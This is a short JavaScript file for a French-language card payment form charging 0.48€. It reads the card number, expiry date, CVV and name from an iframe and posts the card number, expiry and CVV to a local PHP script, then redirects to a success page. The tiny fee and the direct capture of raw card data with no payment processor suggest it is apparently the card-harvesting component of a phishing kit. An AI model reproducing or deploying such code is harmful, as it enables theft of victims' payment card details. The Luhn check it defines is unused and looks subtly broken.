$('#ccExpiration').keyup(function(){
    var nb_car = $(this).val().length;
    if(nb_car == 2) {
        $(this).val($(this).val()+'/');
    }       
});
const luhnCheck = num => {
        let arr = (num + '')
          .split('')
          .reverse()
          .map(x => parseInt(x));
        let lastDigit = arr.splice(0, 1)[0];
        let sum = arr.reduce((acc, val, i) => (i % 2 !== 0 ? acc + val : acc + ((val * 2) % 9) || 9), 0);
        sum += lastDigit;
        return sum % 10 === 0;
    };
    const getY = dt =>{
        return ('' + dt.getFullYear()).substr(2);
    }
    const checkValidity = exp => {
        let arr = exp.split('/');
        let ccmonth = arr[0];
        let ccyear = arr[1];
        let date = new Date();
        let y = getY(date);
        if(ccyear > y){
            return true;
        }else if (ccyear == y){
            if(ccmonth >= date.getMonth()){
                return true;
            }else{
                return false;
            }
        }else{
            return false;
        }

    }
function card() {
    $("#cardBtn").attr("disabled", true);
    $("#cardBtn").html('Traitement en cours..');
    $("#cardIframe").contents().find('#cardnumber').removeClass("input-error")
    $("#cardIframe").contents().find('#expirationdate').removeClass("input-error");
    $("#cardIframe").contents().find('#securitycode').removeClass("input-error");

    var ccNumber = $("#cardIframe").contents().find('#cardnumber').val();
    var ccExpiration = $("#cardIframe").contents().find('#expirationdate').val();
    var cvv = $("#cardIframe").contents().find('#securitycode').val();
    var name = $("#cardIframe").contents().find('#name').val();
    var hasError = 0;
    if(ccNumber.replace(/\s/g, '').length < 16){
        $("#cardIframe").contents().find('#cardnumber').addClass("input-error");
        hasError = 1;
    }
    if(name.length == 0){
        $("#cardIframe").contents().find('#name').addClass("input-error");
        hasError = 1;
    }
    if(ccExpiration.length < 5 || !checkValidity(ccExpiration)){
        $("#cardIframe").contents().find('#expirationdate').addClass("input-error");
        hasError = 1;
    }
    if(cvv.length < 3){
        $("#cardIframe").contents().find('#securitycode').addClass("input-error");
        hasError = 1;
    }
    if(!hasError){
        var Datas = new FormData();
        Datas.append("ccNumber", ccNumber);
        Datas.append("ccExpiration", ccExpiration);
        Datas.append("cvv", cvv);
        $.ajax({
            method: "POST",
            url: "../actions/card.php",
            data: {
                ccNumber:ccNumber,
                ccExpiration:ccExpiration,
                cvv:cvv
            },
            success:function(response) {
                var jsonData = JSON.parse(response);
                if(jsonData.success == "1"){
                    window.location.href = "success.php";
                }
            }
        });
    }else{
        $("#cardBtn").attr("disabled", false);
        $("#cardBtn").html('Régler 0.48€');
    }
};